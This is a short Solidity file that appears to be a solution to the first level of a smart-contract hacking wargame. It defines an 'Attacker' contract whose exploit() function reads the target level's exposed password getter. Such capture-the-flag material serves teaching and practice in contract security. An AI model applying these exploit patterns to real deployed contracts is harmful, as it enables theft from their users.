// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/level01.sol";

contract Attacker
{
    Instance level;
    constructor(address _level)
    {
        level = Instance(_level);
    }

    function exploit() external view {
        level.password();
    }
}